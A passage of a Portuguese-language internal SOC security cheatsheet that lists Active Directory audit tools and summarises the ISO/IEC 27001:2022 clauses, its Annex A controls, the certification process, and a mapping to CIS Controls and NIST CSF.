| PingCastle | AD security score | `PingCastle.exe --healthcheck` |
| Nessus | Vuln scan autenticado | Templates CIS e STIG embutidos |
| Microsoft Policy Analyzer | GPO vs MS Baseline | GUI — importar GPO XML |

---

## 🛡️ ISO/IEC 27001:2022
> ISMS · 93 controles Annex A · 4 Temas · Certificação · `93 controles`

### Visão Geral & Estrutura

| Aspecto | Detalhe |
|---------|---------|
| Edição atual | ISO/IEC 27001:2022 — publicada outubro 2022 |
| Versão anterior | ISO/IEC 27001:2013 (114 controles) |
| Controles atuais | **93 controles** em **4 temas** |
| Controles novos | 11 novos controles na versão 2022 |
| Estrutura | Cláusulas 4–10 (HLS) + Annex A |
| Ciclo | PDCA — Plan-Do-Check-Act contínuo |

### Cláusulas Principais (4–10)

| Cláusula | Nome | Conteúdo |
|----------|------|----------|
| **4** | Contexto | Organização, partes interessadas, escopo do ISMS |
| **5** | Liderança | Alta direção, política de SI, papéis e responsabilidades |
| **6** | Planejamento | Avaliação de riscos, tratamento, objetivos de SI |
| **7** | Suporte | Recursos, competência, conscientização, documentação |
| **8** | Operação | Implementar processos, avaliar e tratar riscos operacionais |
| **9** | Avaliação | Monitoramento, auditoria interna, revisão pela direção |
| **10** | Melhoria | Não-conformidades, ações corretivas, melhoria contínua |

### Annex A — Controles Organizacionais (5.1–5.37) — 37 controles

| Controle | Nome | Objetivo |
|----------|------|----------|
| 5.1 | Políticas de Segurança | Definir, aprovar e revisar políticas alinhadas ao negócio |
| 5.2 | Funções e Responsabilidades | Definir e atribuir responsabilidades de SI |
| 5.3 | Segregação de funções | Separar funções conflitantes para reduzir fraude/erro |
| 5.7 | **Threat Intelligence** ⭐NOVO | Coletar e analisar informações sobre ameaças |
| 5.8 | Segurança em projetos | Integrar SI em todo o ciclo de vida de projetos |
| 5.12 | Classificação da informação | Classificar por confidencialidade e criticidade |
| 5.15 | Controle de Acesso | Acesso baseado em necessidade de negócio |
| 5.16 | Gestão de Identidades | Ciclo de vida de identidades — provisionamento ao desligamento |
| 5.17 | Informações de Autenticação | Senhas, tokens, chaves — políticas e proteção |
| 5.19 | Segurança em fornecedores | Acordar e monitorar requisitos com fornecedores |
| 5.23 | **Cloud Security** ⭐NOVO | Controles para uso, gestão e saída de serviços cloud |
| 5.24 | Gestão de Incidentes | Planejar e implementar processo de gestão de incidentes |
| 5.26 | Resposta a Incidentes | Responder per procedimentos documentados |
| 5.29 | Continuidade de Negócios | Planejar SI durante disrupções — BCP/DRP integrado |
| 5.30 | **ICT Readiness** ⭐NOVO | Prontidão de TIC para continuidade — RTO/RPO, testes failover |
| 5.36 | Conformidade com políticas | Revisar periodicamente conformidade com políticas |

### Annex A — Controles de Pessoas (6.1–6.8) — 8 controles

| Controle | Nome | Objetivo |
|----------|------|----------|
| 6.1 | Screening | Verificação de antecedentes antes e durante o emprego |
| 6.2 | Termos de Emprego | NDA e responsabilidades de SI no contrato |
| 6.3 | Conscientização & Treinamento | Programa contínuo — phishing, engenharia social, políticas |
| 6.4 | Processo Disciplinar | Ações formais para violações de segurança |
| 6.5 | Encerramento / Mudança | Revogar acessos no desligamento ou mudança de função |
| 6.6 | Acordos de Confidencialidade | NDAs para empregados, contratados, terceiros |
| 6.7 | Trabalho Remoto | VPN, MDM, política BYOD — trabalho fora do perímetro |
| 6.8 | Reporte de Eventos | Canal claro para reporte de incidentes e vulnerabilidades |

### Annex A — Controles Físicos (7.1–7.14) — 14 controles

| Controle | Nome | Objetivo |
|----------|------|----------|
| 7.1 | Perímetros Físicos | Barreiras para áreas com ativos de informação |
| 7.2 | Controles de Entrada | Acesso por autenticação (crachá, biometria), registro visitantes |
| 7.3 | Escritórios e Salas | Segurança de salas de servidores, data centers |
| 7.4 | **Monitoramento Físico** ⭐NOVO | CCTV, alarmes, IDS físico em áreas sensíveis |
| 7.6 | Trabalho em Áreas Seguras | Controlar atividades — mínimo pessoal, proibição de registro |
| 7.7 | Mesa Limpa / Tela Limpa | Política mesa limpa, bloqueio automático de tela |
| 7.8 | Equipamentos | Proteção física — UPS, temperatura, cabeamento |
| 7.10 | Mídia de Armazenamento | Inventário, destruição segura, transporte protegido |
| 7.13 | Manutenção de Equipamentos | Manutenção autorizada — evitar comprometimento físico |
| 7.14 | Descarte Seguro | Sanitização antes do descarte — DBAN, certificado de destruição |

### Annex A — Controles Tecnológicos (8.1–8.34) — 34 controles

| Controle | Nome | Objetivo / Implementação |
|----------|------|--------------------------|
| 8.2 | Gestão de Acessos Privilegiados | PAM, JIT, auditoria de uso privilegiado |
| 8.3 | Restrição de Acesso | Need-to-know, RBAC, ABAC |
| 8.5 | Autenticação Segura | MFA, políticas de senha robustas, anti-brute force |
| 8.7 | Proteção contra Malware | AV/EDR, controle de software, conscientização |
| 8.8 | Gestão de Vulnerabilidades | Scan periódico, CVSS scoring, SLA de remediação |
| 8.9 | **Gestão de Configuração** ⭐NOVO | Baseline segura, change management, IaC hardening |
| 8.10 | **Exclusão de Informação** ⭐NOVO | Eliminar dados quando não mais necessários |
| 8.11 | **Mascaramento de Dados** ⭐NOVO | Mascarar dados sensíveis em logs, ambientes de teste |
| 8.12 | **DLP** ⭐NOVO | Data Loss Prevention — classificação, bloqueio de exfiltração |
| 8.15 | Logging | Logs protegidos contra tampering, retidos adequadamente |
| 8.16 | **Monitoramento de Atividades** ⭐NOVO | SIEM, monitoramento de rede, comportamento anômalo |
| 8.20 | Segurança de Redes | Segmentação, IDS/IPS, DMZ, controle entre zonas |
| 8.22 | **Filtragem Web** ⭐NOVO | Filtrar acesso a sites maliciosos, proxies de segurança |
| 8.24 | Uso de Criptografia | Política de criptografia — algoritmos aprovados, TLS/mTLS |
| 8.25 | Desenvolvimento Seguro | Secure-by-design, revisão de código, SAST/DAST |
| 8.28 | **Secure Coding** ⭐NOVO | OWASP Top 10, code review, dependency scanning |
| 8.29 | Teste de Segurança no Dev | SAST, DAST, pentest antes de produção — integrado ao SDLC |
| 8.31 | Separação Dev/Test/Prod | Ambientes separados, dados reais mascarados em dev/test |

### Processo de Certificação

| Fase | Descrição |
|------|-----------|
| **Gap Analysis** | Mapear estado atual vs ISO 27001 — identificar lacunas |
| **Escopo do ISMS** | Definir fronteiras — sistemas, processos, locais, serviços |
| **Avaliação de Risco** | Metodologia documentada (ISO 31000), registro de riscos |
| **Tratamento de Risco** | Aceitar / Mitigar / Transferir / Evitar — prazo + responsável |
| **Auditoria Interna** | Auditores independentes do processo — mínimo anual |
| **Stage 1 Audit** | Auditoria documental — ISMS documentado e prontidão |
| **Stage 2 Audit** | Auditoria de implementação — controles em operação no campo |
| **Certificação** | Válida 3 anos — vigilância anual (anos 1-2), recertificação ano 3 |
| **Organismos** | BSI, Bureau Veritas, SGS, DNV, LRQA, TÜV |

### ISO 27001 × CIS × NIST CSF — Mapeamento

| ISO 27001 Annex A | CIS Controls v8 | NIST CSF |
|-------------------|-----------------|----------|
| 5.15–5.18 — Access Control | CIS 5, 6 — Account/Access Mgmt | PR.AC — Access Control |
| 8.8 — Vulnerability Mgmt | CIS 7 — Vulnerability Mgmt | ID.RA / RS.MI |
| 8.7 — Malware Protection | CIS 10 — Malware Defenses | PR.DS / DE.CM |
| 8.15–8.16 — Logging/Monitoring | CIS 8 — Audit Log Mgmt | DE.CM / DE.AE |
| 5.24–5.26 — Incident Mgmt | CIS 17 — Incident Response | RS — Respond |
| 8.9 — Config Management | CIS 4 — Secure Configuration | PR.IP |
| 8.20–8.22 — Network Security | CIS 12, 13 — Network Monitoring | PR.AC / DE.CM |
| 5.29–5.30 — Continuity/ICT | CIS 11 — Data Recovery | RC — Recover |

---

*Security Cheatsheet v3 · SOC Operations · Uso interno*  
*Atualizado 2025 · 18 seções · 500+ itens*
